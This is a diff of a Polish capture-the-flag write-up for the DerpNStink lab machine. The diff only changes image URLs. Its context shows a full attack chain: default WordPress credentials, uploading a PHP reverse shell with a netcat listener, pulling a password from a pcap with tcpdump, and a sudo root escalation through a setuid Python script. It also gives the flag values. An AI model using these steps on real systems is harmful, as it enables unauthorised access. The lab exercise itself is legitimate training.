@@ -239,18 +239,18 @@ Dodatkowo wpscan odsłonił przed nami dwóch użytkowników
 ```
 
 Pozostaje nam wykorzystać tę informację i spróbować się zalogować
-![wp-login-page.png](https://github.com/d15rup7or/Labs/master/DerpNStink/img/wp-login-page.png)
+![wp-login-page.png](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/wp-login-page.png)
 
 Zobaczmy czy zadziała z tym hasłem
 `login:admin password:admin`
 
 Tym razem się udało. W rezultacie trafiamy do panelu wordpressa jako użytkownik z ograniczonymi uprawnieniami. 
-![](https://github.com/d15rup7or/Labs/master/DerpNStink/img/slideshow.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/slideshow.png)
 
 ## 2. Reverse shell
 
 Kolejnym krokiem będzie uploadowanie [PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) (Kali Linux ma go w katalogu `usr/share/webshells/php`) (wcześniej zmieniamy w nim parametry $ip na adres maszyny wirtualnej oraz $port) 
-![shell-upload.png](https://github.com/d15rup7or/Labs/master/DerpNStink/img/shell-upload.png)
+![shell-upload.png](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/shell-upload.png)
 
 Odpalamy netcat i ustawiamy go tak żeby nasłuchiwał na uprzednio wybranym porcie. Dla nas będzie to port **4443**: <br>
 `nc -nlvp 4443`
@@ -562,7 +562,7 @@ unclestinky:wedgie57
 ```
 
 Wykorzystajmy te dane aby zalogować się do wordpressa. Szybkie rozeznanie i trafiamy do zakładki **Posts**. Tam już czeka na nas szkic postu `**Flag2.txt**` a w nim druga flaga:
-![](https://github.com/d15rup7or/Labs/master/DerpNStink/img/flag2.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/flag2.png)
 `flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)`
 
 ## 4. Uruchomienie powłoki z nowego konta
@@ -594,15 +594,15 @@ Działa! Czas się porozglądać!
 Wejdźmy do katalogu `home` i poszukajmy plików, które mogą zawierać na przykład dalsze wskazówki.
 Trzecią flagę znajdziemy w katalogu `Desktop` w pliku `flag.txt`
 `flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)`
-![](https://github.com/d15rup7or/Labs/master/DerpNStink/img/flag3.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/flag3.png)
 Idąc dalej, w katalogu `network-logs` odkrywamy zapis konwersacji pomiędzy użytkownikami:
-![](https://github.com/d15rup7or/Labs/master/DerpNStink/img/conversation.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/conversation.png)
 Dowiadujemy się, że user `stinky` może coś wiedzieć na temat hasła usera `mrderp` \
 Szukamy teraz odpowiedniego pliku z rozszerzeniem `.pcap` \
 Namierzamy go w katalogu `Documents`
 Przyda nam się dostęp do sniffera `tcpdump` żeby zajrzeć do środka pliku \
 `tcpdump -nt -r derpissues.pcap -A | grep -P 'pwd='`
-![](https://github.com/d15rup7or/Labs/master/DerpNStink/img/pcap-tcpdump.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/pcap-tcpdump.png)
 Przy użyciu `grep` błyskawicznie przejęliśmy hasło usera `mrderp` \
 `derpderpderpderpderpderpderp`
 
@@ -646,7 +646,7 @@ Resolution: Closing ticket. ticket notification.
 ```
 W tekście mamy podany link do strony Self Help Web. Upewnijmy się co kryje się za tym adresem :)
 
-![](https://github.com/d15rup7or/Labs/master/DerpNStink/img/pastebin.png) 
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/pastebin.png) 
 
 Wygląda zupełnie jak wskazówka, która pozwoli nam eskalować nasze uprawnienia
 
@@ -661,10 +661,10 @@ $ echo -e '#!/usr/bin/env python\nimport os\nos.setuid(0)\nos.setgid(0)\nos.syst
 $ chmod +x /home/mrderp/binaries/derpy
 $ sudo /home/mrderp/binaries/derpy
 ```
-![](https://github.com/d15rup7or/Labs/master/DerpNStink/img/root.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/root.png)
 
 I czas na odnalezienie ostatniej flagi:
 
-![](https://github.com/d15rup7or/Labs/master/DerpNStink/img/flag4.png)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/DerpNStink/img/flag4.png)
 
 `flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)`
